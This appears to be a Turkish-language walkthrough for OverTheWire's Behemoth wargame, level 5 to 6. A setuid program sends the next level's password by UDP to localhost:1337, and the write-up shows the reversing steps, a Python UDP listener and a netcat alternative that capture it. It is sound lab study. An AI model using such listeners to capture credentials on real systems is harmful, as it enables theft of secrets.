# OverTheWire — Behemoth Level 5 → 6

> Hedef: `behemoth5`'ten `behemoth6` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: program şifreyi **UDP** ile `localhost:1337`'ye yolluyor → dinleyip yakala.

---

## 1. Bağlantı
```bash
ssh behemoth5@behemoth.labs.overthewire.org -p 2221
```

## 2. Zafiyet — disasm + rodata
```c
f = fopen("/etc/behemoth_pass/behemoth6", "r");   // behemoth6 şifresini oku (suid)
... fgets(buf, len, f); ...
he = gethostbyname("localhost");                  // rodata: "localhost"
sock = socket(AF_INET, SOCK_DGRAM, 0);            // UDP
... htons(atoi("1337")) ...                       // rodata: "1337"
sendto(sock, buf, ..., localhost:1337);           // şifreyi UDP ile yolla
```
Şifre `localhost:1337`'ye UDP datagram olarak gidiyor → o portu dinlersem yakalarım.

## 3. Exploit
```bash
# UDP listener (port 1337), sonra behemoth5'i çalıştır
python3 -c '
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",1337))
data,_=s.recvfrom(1024)
open("/tmp/cap5.txt","w").write(data.decode())
' &
sleep 1
for n in 1 2 3; do /behemoth/behemoth5 2>/dev/null; sleep 0.4; done   # UDP fire-and-forget -> tekrar
sleep 0.5; cat /tmp/cap5.txt
```
Çıktı: yakalanan 10-karakter şifre. (Sunucuda `nc`/`ncat` de var: `nc -ulp 1337`.)


## Dersler
| Konu | Not |
|------|-----|
| ağ üzerinden sızıntı | program hassas veriyi local socket'e yolluyor → dinle |
| UDP | bağlantısız; listener `sendto`'dan ÖNCE hazır olmalı (önce bind) |
| port/host tespiti | rodata + disasm (`gethostbyname`, `htons`, port string) |

